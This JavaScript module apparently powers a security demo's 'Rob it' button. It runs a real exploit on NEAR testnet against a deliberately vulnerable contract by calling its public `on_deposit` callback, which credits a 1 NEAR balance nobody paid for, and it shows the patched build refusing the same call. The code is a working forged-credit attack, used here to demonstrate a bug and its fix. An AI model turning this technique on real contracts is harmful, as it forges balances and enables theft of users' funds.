// "Rob it": the real PF001 exploit, run from the browser on NEAR testnet with no wallet. The key behind this button is
// a function-call key limited to one method, `on_deposit`, on the chameleon, held by a throwaway account
// (`robber.preflight-guard.testnet`) with a small gas allowance. A function-call key can attach no deposit, so it also
// cannot call `withdraw`: nothing this page forges ever leaves the contract. On the vulnerable build `on_deposit` is a
// public method, so this transaction succeeds and credits a balance the attacker never paid for (PF001). On the patched
// build the same call fails on chain: `on_deposit` is `#[private]`, so only the chameleon itself may call it.
// Same chain reads, same nonce and network handling as the Swap's flip (swap.js: `txOutcome`, `CANNOT_PAY`, `NONCE`):
// a stale nonce from another visitor's click is read again and signed again, and a lost answer is looked up by hash
// before anything is called failed. Everything that came from the chain reaches the page as text (swap-view.js paints it).
import { base58Decode, base58Encode, encodeFunctionCall, isHash, parseSecretKey, signTransaction } from './near.js';
import { callView, CANNOT_PAY, createRpc, isAccountId, NONCE, NONCE_TRIES, query, RpcError, TX_LOOKUPS, txOutcome } from './swap.js';

export const ROB_METHOD = 'on_deposit';
// A forged credit, in yoctoNEAR: big enough to see jump, far more than any depositor's storage entry, and never paid
// for. This key cannot attach a deposit (no function-call key ever can), so it cannot call `withdraw`: the forged
// number only ever grows in the contract's own bookkeeping, never as NEAR that leaves it through this page.
export const ROB_AMOUNT_YOCTO = '1000000000000000000000000'; // 1 NEAR

const isObject = (v) => typeof v === 'object' && v !== null && !Array.isArray(v);
const toYocto = (value) => (typeof value === 'string' && /^\d{1,30}$/.test(value) ? BigInt(value) : null);

/** The config as the controller uses it, or `{ ok: false, missing }`. `chameleonId` and `rpcUrls` are the Swap's own fields. */
export function readRobConfig(config) {
  const missing = [];
  if (!isAccountId(config.chameleonId)) missing.push('chameleonId');
  if (!isAccountId(config.robberId)) missing.push('robberId');
  let secret = null;
  try { secret = parseSecretKey(config.robberKey); } catch { missing.push('robberKey'); }
  if (!Number.isInteger(config.robGasTgas) || config.robGasTgas < 1 || config.robGasTgas > 300) missing.push('robGasTgas');
  if (!Array.isArray(config.rpcUrls) || config.rpcUrls.length === 0 || config.rpcUrls.length > 6 || !config.rpcUrls.every((url) => typeof url === 'string' && /^https:\/\/[\w.-]+(:\d+)?(\/\S*)?$/.test(url))) missing.push('rpcUrls');
  if (missing.length) return { ok: false, missing };
  return { ok: true, chameleonId: config.chameleonId, robberId: config.robberId, rpcUrls: config.rpcUrls, secret, gas: BigInt(config.robGasTgas) * 10n ** 12n };
}

/** The contract's own panic text from a failed outcome, else a plain sentence. Chain text, so it only ever reaches the page as text. */
function failureMessage(failure) {
  const panic = /Smart contract panicked: ([^"\\]{1,160})/.exec(JSON.stringify(failure));
  return panic ? panic[1] : 'The transaction failed on chain.';
}

/**
 * Starts nothing by itself. `sync(canAct)` tells it whether the Swap has a live chain to act on: Rob It never polls the
 * chain on its own, it only reads when clicked, so a button that is always disabled while the Swap is not live never
 * sends anything either.
 *
 * state.ok       false when `config` is missing a field this controller needs (programmer error, not a chain problem).
 * state.canAct   the Swap has a live chain (set by `sync`); the button is enabled only when this is true.
 * state.build    the hash of the code live when `sync` last saw one, or null. A result belongs to the code it ran against: when
 *                this changes (any visitor's swap, the idle reset) the result is cleared back to idle, and a rob still in
 *                flight at that moment is dropped when it ends, never painted under the new code's narrative.
 * state.stage    'idle' | 'reading' | 'pending' | 'done' | 'refused' | 'cannot-pay' | 'failed' | 'unconfirmed'.
 *                'refused' is the wow: the patched build's own code said no, on chain. 'cannot-pay' is the shared key's
 *                gas allowance or balance running out (the watchdog refills it; nothing is lost by waiting).
 * state.before / state.after   the attacker's forged balance (yoctoNEAR string) read before and after this click, or null.
 * state.hash     this click's transaction hash, once signed, or null.
 * state.message  the chain's own refusal text for 'refused' and 'failed', else ''.
 */
export function createRob({ config, onChange = () => {}, env: overrides = {} }) {
  const env = {
    fetch: (...args) => globalThis.fetch(...args),
    now: () => Date.now(),
    sleep: (ms) => new Promise((resolve) => setTimeout(resolve, ms)),
    subtle: globalThis.crypto?.subtle,
    ...overrides,
  };
  const cfg = readRobConfig(config);
  const net = cfg.ok ? createRpc(env, cfg.rpcUrls) : null;
  const IDLE = { stage: 'idle', before: null, after: null, hash: null, message: '' };
  let state = { ok: cfg.ok, missing: cfg.ok ? [] : cfg.missing, canAct: false, build: null, ...IDLE };
  const set = (patch) => { state = { ...state, ...patch }; onChange(state); };
  let busy = false;
  let stale = false; // the live code changed while a rob was in flight: its result is for the other build, so it is dropped
  const finish = (patch) => set(stale ? IDLE : patch);

  async function balanceOf(accountId) {
    const amount = toYocto(await callView(net, cfg.chameleonId, 'balance_of', { account_id: accountId }));
    if (amount === null) throw new RpcError('balance_of returned no usable amount', 'shape');
    return amount.toString();
  }

  /**
   * The forged balance after a successful call. An RPC node a block behind still answers with the old balance, so read until it has moved;
   * if every read lags, the transaction's own success settles it: the call credits exactly ROB_AMOUNT_YOCTO.
   */
  async function creditedBalance(before) {
    for (let attempt = 0; attempt < 6; attempt += 1) {
      if (attempt > 0) await env.sleep(700);
      const after = await balanceOf(cfg.robberId).catch(() => null);
      if (after !== null && BigInt(after) > BigInt(before)) return after;
    }
    return (BigInt(before) + BigInt(ROB_AMOUNT_YOCTO)).toString();
  }

  return {
    getState: () => state,
    /** `canAct`: the Swap reports a live chain; `build`: the hash of the code live right now, or null when unknown. Rob It reads nothing on its own. */
    sync(canAct, build = null) {
      const patch = {};
      if (canAct !== state.canAct && !busy) patch.canAct = canAct;
      if (build !== null && build !== state.build) {
        patch.build = build;
        if (state.build !== null) { if (busy) stale = true; else Object.assign(patch, IDLE); }
      }
      if (Object.keys(patch).length) set(patch);
    },
    async rob() {
      if (!cfg.ok || busy || !state.canAct) return;
      busy = true;
      stale = false;
      let hash = null;
      let sent = false;
      try {
        set({ stage: 'reading', message: '' });
        const before = await balanceOf(cfg.robberId);
        set({ stage: 'pending', before, after: null, hash: null, message: '' });
        let result;
        for (let attempt = 0; ; attempt++) {
          const [key, block] = await Promise.all([
            query(net, { request_type: 'view_access_key', account_id: cfg.robberId, public_key: `ed25519:${base58Encode(cfg.secret.publicKey)}` }),
            net.call('block', { finality: 'final' }),
          ]);
          if (!Number.isSafeInteger(key.nonce) || !isHash(block?.header?.hash)) throw new RpcError('the access key or block answer is unusable', 'shape');
          const bytes = encodeFunctionCall({
            signerId: cfg.robberId, publicKey: cfg.secret.publicKey, nonce: key.nonce + 1, receiverId: cfg.chameleonId, blockHash: base58Decode(block.header.hash),
            method: ROB_METHOD, args: new TextEncoder().encode(JSON.stringify({ depositor: cfg.robberId, refund: ROB_AMOUNT_YOCTO, net: ROB_AMOUNT_YOCTO })), gas: cfg.gas,
          });
          const signed = await signTransaction(bytes, config.robberKey, env.subtle);
          hash = signed.txHash;
          set({ stage: 'pending', hash, message: '' });
          sent = true;
          try {
            result = await net.call('send_tx', { signed_tx_base64: signed.signedBase64, wait_until: 'EXECUTED_OPTIMISTIC' }, { retry: false });
            break;
          } catch (error) {
            // No answer from any endpoint: the transaction may still have landed, so ask for it by hash before saying anything failed.
            if (error.kind === 'network') {
              result = await txOutcome(net, env, cfg.robberId, hash, TX_LOOKUPS);
              if (result) break;
              throw error;
            }
            // Another visitor used the shared key a moment ago: read its nonce again and sign again, as the Swap's flip does.
            if (error.kind === 'rpc' && NONCE.test(error.detail) && attempt + 1 < NONCE_TRIES) {
              result = await txOutcome(net, env, cfg.robberId, hash, 1);
              if (result) break;
              sent = false;
              continue;
            }
            throw error;
          }
        }
        const status = result?.status;
        if (isObject(status) && 'Failure' in status) {
          if (CANNOT_PAY.test(JSON.stringify(status.Failure))) { finish({ stage: 'cannot-pay', hash, message: '' }); return; }
          const message = failureMessage(status.Failure);
          finish({ stage: /is private/.test(message) ? 'refused' : 'failed', hash, message });
          return;
        }
        if (!isObject(status) || !('SuccessValue' in status)) throw new RpcError('send_tx returned no final status', 'network');
        finish({ stage: 'done', hash, after: await creditedBalance(before), message: '' });
      } catch (error) {
        if (error instanceof RpcError && error.kind === 'rpc' && CANNOT_PAY.test(error.detail)) { finish({ stage: 'cannot-pay', hash: null, message: '' }); return; }
        const unconfirmed = sent && error instanceof RpcError && error.kind === 'network';
        finish({ stage: unconfirmed ? 'unconfirmed' : 'failed', hash: sent ? hash : null, message: error instanceof RpcError ? (sent ? '' : 'Nothing was sent. ') + error.message : error.message });
      } finally {
        busy = false;
      }
    },
  };
}
